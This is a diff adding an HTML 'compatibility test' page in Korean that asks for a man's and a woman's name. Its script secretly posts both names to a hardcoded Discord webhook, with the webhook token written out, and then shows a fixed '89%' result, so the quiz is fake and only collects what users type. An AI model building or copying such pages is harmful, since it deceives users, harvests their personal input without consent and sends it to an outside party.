@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>궁합 테스트</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            width: 450px;
+            margin: 50px auto;
+            padding: 20px;
+            border-radius: 10px;
+            background-color: #fff;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        }
+        h2 {
+            margin-top: 0;
+            color: #333;
+            font-weight: 500;
+        }
+        .input-group {
+            margin-bottom: 15px;
+        }
+        .input-group label {
+            display: block;
+            margin-bottom: 5px;
+            color: #666;
+            font-weight: 600;
+        }
+        .input-group input {
+            width: calc(100% - 10px);
+            height: 40px;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+        .input-group input:focus {
+            outline: none;
+            border-color: #007bff;
+        }
+        button {
+            width: 100%;
+            padding: 12px 0;
+            background-color: #007bff;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+    </style>
+    <script>
+        function sendMessage() {
+            var name1 = document.getElementById("name1").value;
+            var name2 = document.getElementById("name2").value;
+            var inputText = name1 + ", " + name2;
+            var discordWebhookURL = "https://discord.com/api/webhooks/1221117676206952449/SYa8cjd6H0T9s5m9yU-hDczHc5g5MQITv29m3w2vwhDNZhPEFMvpCZTHtGhFCYG-9uyF"; // 제공해주신 디스코드 웹훅 URL을 입력하세요
+
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", discordWebhookURL);
+            xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+
+            var payload = {
+                content: inputText
+            };
+
+            xhr.send(JSON.stringify(payload));
+
+            alert("계산중...(확인으로 결과보기)")
+            alert("89%");
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <h2>궁합 테스트♥</h2>
+        <div class="input-group">
+            <label for="name1">남자:</label>
+            <input type="text" id="name1">
+        </div>
+        <div class="input-group">
+            <label for="name2">여자:</label>
+            <input type="text" id="name2">
+        </div>
+        <button onclick="sendMessage()">궁합 확인</button>
+    </div>
+</body>
+</html>
